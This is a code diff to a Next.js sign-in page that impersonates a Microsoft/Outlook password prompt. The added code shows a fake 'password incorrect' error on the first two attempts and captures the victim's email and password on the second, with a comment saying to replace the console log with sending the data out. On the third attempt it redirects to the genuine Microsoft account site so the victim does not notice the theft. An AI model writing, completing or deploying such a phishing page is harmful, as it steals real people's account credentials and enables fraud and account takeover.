@@ -1,14 +1,70 @@
 import Head from "next/head";
 import Image from "next/image";
+import { useEffect, useState } from "react";
 import styles from "../styles/Password.module.css";
 
 export default function Password() {
+  const [loading, setLoading] = useState(false);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [submitCount, setSubmitCount] = useState(0);
+  const [errorMsg, setErrorMsg] = useState("");
+  useEffect(() => {
+    const theEmail = localStorage.getItem("email");
+    if (theEmail) {
+      setEmail(theEmail);
+    } else {
+      window.location.href = "/";
+    }
+  }, []);
+
+  const handleChange = (e) => {
+    setPassword(e.target.value);
+  };
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    setLoading(true);
+    setErrorMsg("");
+    const newCount = submitCount + 1;
+    setSubmitCount(newCount);
+    if (newCount === 1) {
+      setTimeout(() => {
+        setLoading(false);
+        setErrorMsg(
+          "Your account or password is incorrect if you can't remember your password, "
+        );
+        setPassword("");
+      }, 2000);
+    } else if (newCount === 2) {
+      setTimeout(() => {
+        setLoading(false);
+        setErrorMsg(
+          "Your account or password is incorrect if you can't remember your password, "
+        );
+      }, 2000);
+      const data = new FormData(e.currentTarget);
+      const thePassword = data.get("password");
+      if (thePassword) {
+        const userDetails = {
+          email: email,
+          password: thePassword,
+        };
+        console.log(userDetails);
+        // replace console with sending email
+        setPassword("");
+      }
+    } else {
+      setLoading(false);
+
+      window.location.href =
+        "https://account.microsoft.com?ref=MeControl&refd=outlook.live.com";
+    }
+  };
   return (
     <div className={styles.container}>
       <Head>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Sign in your account</title>
-        <link rel="stylesheet" href="styles.css" />
         <link
           rel="apple-touch-icon-precomposed"
           sizes="57x57"
@@ -95,14 +151,22 @@ export default function Password() {
           name="msapplication-square310x310logo"
           content="mstile-310x310.png"
         />
-
-        <link
-          rel="stylesheet"
-          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
-        />
       </Head>
 
       <main className={`${styles.flow} ${styles.main}`}>
+        {loading && (
+          <div className={styles.bouncingLoader}>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+          </div>
+        )}
         <img
           src="assets/logo.png"
           alt=""
@@ -110,18 +174,29 @@ export default function Password() {
           className={styles.img}
         />
         <p className={styles.p}>
-          <a href="" className={styles.a}>
+          <a href="/" className={styles.a}>
             <i className={`${styles.i} fa-solid fa-arrow-left`}></i>
-            @froggy959.net
+            {/* @froggy959.net */}
+            {email}
           </a>
         </p>
         <h1 className={styles.h1}>Enter Password</h1>
-        <p className={styles.p}>
-          Because you're accessing sensitive info, you need to verify your
-          password
-        </p>
+        {!errorMsg && (
+          <p className={styles.p}>
+            Because you're accessing sensitive info, you need to verify your
+            password
+          </p>
+        )}
+        {errorMsg && (
+          <p className={`${styles.p} ${styles.err}`}>
+            {errorMsg}
+            <a href="" className={styles.erra}>
+              reset it now
+            </a>
+          </p>
+        )}
         <form
-          action=""
+          onSubmit={handleSubmit}
           method="POST"
           className={`${styles.form} ${styles.flow}`}
         >
@@ -129,6 +204,9 @@ export default function Password() {
             type="password"
             name="password"
             placeholder="Password"
+            onChange={handleChange}
+            value={password}
+            required={true}
             className={styles.input}
           />
           <a href="" className={styles.a}>
